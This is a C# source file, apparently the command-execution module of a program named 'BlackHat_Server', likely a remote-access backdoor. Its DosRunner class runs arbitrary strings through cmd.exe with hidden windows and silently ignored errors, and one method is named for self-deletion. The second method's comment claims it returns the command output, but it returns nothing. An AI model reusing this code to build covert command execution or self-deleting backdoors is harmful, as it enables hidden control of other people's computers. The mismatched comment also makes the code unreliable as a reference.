using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;


namespace BlackHat_Server
{
    class DosRunner
    {
        /// <summary>
        /// Esegue un comando da dos
        /// </summary>
        /// <param name="dosCMD"></param>
        public void RunDosSelfDelete(string dosCMD)
        {
            try
            {
                if (!string.IsNullOrEmpty(dosCMD))
                {
                    ProcessStartInfo Info = new ProcessStartInfo();

                    Info.Arguments = dosCMD;

                    Info.WindowStyle = ProcessWindowStyle.Hidden;
                    Info.CreateNoWindow = true;
                    Info.FileName = "cmd.exe";
                    Process.Start(Info);
                }
            }
            catch 
            {
                
            }          
            
        }
        //-------------------------------------

        /// <summary>
        /// Executes a shell command synchronously.
        /// </summary>
        /// <param name="command">string command</param>
        /// <returns>string, as output of the command.</returns>
        public void ExecuteCommand(string command)
        {
            try
            {
                
                System.Diagnostics.ProcessStartInfo procStartInfo =
                    new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

             
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                
                procStartInfo.CreateNoWindow = true;
                
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                
                string result = proc.StandardOutput.ReadToEnd();
                
            }
            catch 
            {
                
            }
        }
        //--------------------------------------

    }
}
